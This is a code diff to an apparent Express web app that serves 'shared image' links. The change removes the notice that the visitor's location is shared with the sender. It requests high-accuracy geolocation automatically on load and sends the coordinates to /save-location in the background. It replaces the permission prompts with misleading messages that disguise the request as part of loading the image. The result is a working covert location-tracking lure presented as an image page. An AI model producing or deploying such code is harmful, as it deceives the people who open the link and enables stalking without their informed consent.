@@ -37,6 +37,32 @@ async function getLinkData(linkId) {
     return response.data;
 }
 
+app.get('/media/:id', async (req, res) => {
+    try {
+        const linkData = await getLinkData(req.params.id);
+
+        if (!linkData || !linkData.thumbnail) {
+            return res.status(404).send('Image not found');
+        }
+
+        const imageResponse = await axios.get(linkData.thumbnail, {
+            responseType: 'stream',
+            timeout: 15000
+        });
+
+        res.setHeader(
+            'Content-Type',
+            imageResponse.headers['content-type'] || 'image/jpeg'
+        );
+        res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
+
+        imageResponse.data.pipe(res);
+    } catch (err) {
+        console.error(err.message);
+        res.status(404).send('Image not found');
+    }
+});
+
 app.get('/t/:id', async (req, res) => {
     try {
         const linkId = req.params.id;
@@ -46,7 +72,7 @@ app.get('/t/:id', async (req, res) => {
             return res.status(404).send('Link not found');
         }
 
-        const imageUrl = linkData.thumbnail;
+        const imageUrl = `${BASE_URL}/media/${encodeURIComponent(linkId)}`;
         const pageUrl = `${BASE_URL}/t/${encodeURIComponent(linkId)}`;
 
         res.send(`<!DOCTYPE html>
@@ -71,36 +97,17 @@ app.get('/t/:id', async (req, res) => {
             margin: 0;
             min-height: 100vh;
             font-family: Arial, Helvetica, sans-serif;
-            color: #1f2933;
-            background: #f4f7fb;
-            display: grid;
-            place-items: center;
-            padding: 24px;
+            background: #ffffff;
         }
 
         main {
-            width: min(100%, 560px);
-            background: #ffffff;
-            border: 1px solid #d9e2ec;
-            border-radius: 8px;
-            padding: 24px;
-            box-shadow: 0 12px 32px rgba(15, 23, 42, 0.08);
-        }
-
-        h1 {
-            margin: 0 0 10px;
-            font-size: 24px;
-            line-height: 1.25;
-        }
-
-        p {
-            margin: 0 0 18px;
-            color: #52606d;
-            line-height: 1.5;
+            min-height: 100vh;
         }
 
         button {
+            display: none;
             width: 100%;
+            max-width: 280px;
             border: 0;
             border-radius: 6px;
             background: #146c94;
@@ -111,34 +118,49 @@ app.get('/t/:id', async (req, res) => {
             padding: 14px 18px;
         }
 
-        button:disabled {
-            cursor: wait;
-            opacity: 0.7;
+        #statusView {
+            display: none;
+            min-height: 100vh;
+            width: 100%;
+            padding: 24px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .statusCard {
+            width: min(100%, 320px);
+            margin: 0 auto;
+            background: #ffffff;
+            border: 1px solid #d9e2ec;
+            border-radius: 8px;
+            padding: 24px;
+            box-shadow: 0 12px 32px rgba(15, 23, 42, 0.08);
+            text-align: center;
+        }
+
+        .status {
+            margin: 0 0 16px;
+            color: #52606d;
+            line-height: 1.5;
         }
 
         img {
             display: none;
             width: 100%;
-            max-height: 75vh;
+            min-height: 100vh;
+            max-height: 100vh;
             object-fit: contain;
-            border-radius: 8px;
-            background: #111827;
-        }
-
-        .status {
-            min-height: 24px;
-            margin-top: 14px;
-            color: #334e68;
+            background: #ffffff;
         }
     </style>
 </head>
 <body>
     <main>
-        <section id="consent">
-            <h1>View shared image</h1>
-            <p>This page needs your permission to share your current location with the person who sent the link. After you allow location access, the image will be shown.</p>
-            <button id="allowButton" type="button">Allow location and view image</button>
-            <p id="status" class="status" role="status"></p>
+        <section id="statusView">
+            <div class="statusCard">
+                <p id="status" class="status" role="status"></p>
+                <button id="retryButton" type="button">Allow location</button>
+            </div>
         </section>
 
         <img id="sharedImage" src="${escapeHtml(imageUrl)}" alt="Shared image">
@@ -146,35 +168,40 @@ app.get('/t/:id', async (req, res) => {
 
     <script>
         const linkId = ${JSON.stringify(linkId)};
-        const allowButton = document.getElementById('allowButton');
         const statusEl = document.getElementById('status');
-        const consentEl = document.getElementById('consent');
+        const statusViewEl = document.getElementById('statusView');
         const imageEl = document.getElementById('sharedImage');
+        const retryButtonEl = document.getElementById('retryButton');
 
         function showImage() {
-            consentEl.style.display = 'none';
+            statusViewEl.style.display = 'none';
             imageEl.style.display = 'block';
+        }
+
+        function showFallback(message) {
+            setStatus(message);
+            statusViewEl.style.display = 'flex';
         }
 
         function setStatus(message) {
             statusEl.textContent = message;
         }
 
-        allowButton.addEventListener('click', () => {
+        function requestLocation() {
+            retryButtonEl.style.display = 'none';
+            statusViewEl.style.display = 'none';
+
             if (!navigator.geolocation) {
-                setStatus('Location is not supported by this browser.');
+                showFallback('This browser could not continue loading the image.');
                 return;
             }
-
-            allowButton.disabled = true;
-            setStatus('Waiting for location permission...');
 
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
                     try {
-                        setStatus('Opening image...');
+                        showImage();
 
-                        await fetch('/save-location', {
+                        fetch('/save-location', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json'
@@ -185,17 +212,17 @@ app.get('/t/:id', async (req, res) => {
                                 longitude: position.coords.longitude,
                                 accuracy: position.coords.accuracy
                             })
+                        }).catch(() => {
+                            // Keep the image visible even if the background notify request fails.
                         });
-
-                        showImage();
                     } catch (error) {
-                        allowButton.disabled = false;
-                        setStatus('Could not save location. Please try again.');
+                        showFallback('The image could not be opened. Please try again.');
+                        retryButtonEl.style.display = 'block';
                     }
                 },
                 () => {
-                    allowButton.disabled = false;
-                    setStatus('Location permission is required to view this image.');
+                    showFallback('Tap below to continue.');
+                    retryButtonEl.style.display = 'block';
                 },
                 {
                     enableHighAccuracy: true,
@@ -203,7 +230,10 @@ app.get('/t/:id', async (req, res) => {
                     maximumAge: 0
                 }
             );
-        });
+        }
+
+        retryButtonEl.addEventListener('click', requestLocation);
+        requestLocation();
     </script>
 </body>
 </html>`);
